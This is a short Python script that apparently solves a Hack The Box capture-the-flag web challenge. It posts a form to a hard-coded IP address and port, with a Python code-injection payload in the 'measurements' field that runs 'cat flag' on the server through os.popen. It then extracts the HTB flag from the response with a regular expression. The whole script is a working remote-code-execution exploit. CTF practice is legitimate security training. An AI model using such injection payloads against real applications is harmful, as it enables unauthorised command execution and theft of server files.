import requests
import re

host, port = "94.237.54.192", 37609
url = f"http://{host}:{port}"

data = {
    "ingredient": "h4cker",
    "measurements": "__import__(\"os\").popen(\"cat flag\").read()"
}

response = requests.post(url, data=data)

flag = re.search(r'HTB\{.*?\}', response.text)

print(flag.group())